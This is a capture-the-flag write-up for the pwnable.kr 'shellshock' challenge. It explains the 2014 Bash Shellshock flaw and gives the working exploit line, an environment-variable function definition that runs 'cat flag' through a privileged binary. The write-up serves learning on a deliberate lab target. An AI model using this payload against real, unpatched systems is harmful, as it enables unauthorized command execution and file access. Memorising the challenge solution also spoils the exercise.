## Description
shellshock - 1 pt [writeup]

> Mommy, there was a shocking news about bash.
> I bet you already know, but lets just make it sure :)
>
>
> ssh shellshock@pwnable.kr -p2222 (pw:guest)

## Solution
The title of the challenge is a reference to the Shellshock vulnerability, which was a vulnerability in the Bash shell. The vulnerability was discovered in 2014, and was fixed in Bash 4.3. The vulnerability was caused by a flaw in the way Bash handled environment variables.\
You can read more about it [here](https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability).

### shellshock.c
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```
So as we see, the binary is setting the real, effective and saved user and group IDs to the effective group ID. Then it executes the bash shell with the command `echo shock_me`.\
We can assume that the bash shell is vulnerable to the Shellshock vulnerability, so we'll try to exploit it.

So to exploit this vulnerability, we need to set an environment variable that will be executed by the vulnerable Bash shell.\
We can do this by using the `env` command.
```shell
$ ssh shellshock@pwnable.kr -p2222
shellshock@pwnable:~$ env shock_me='() { :;}; cat flag' ./shellshock
[ ... FLAG ... ]
Segmentation fault (core dumped)
```
and we got the flag!

## Setup
```shell
mkdir shellshock && scp -P2222 shellshock@pwnable.kr:* shellshock
```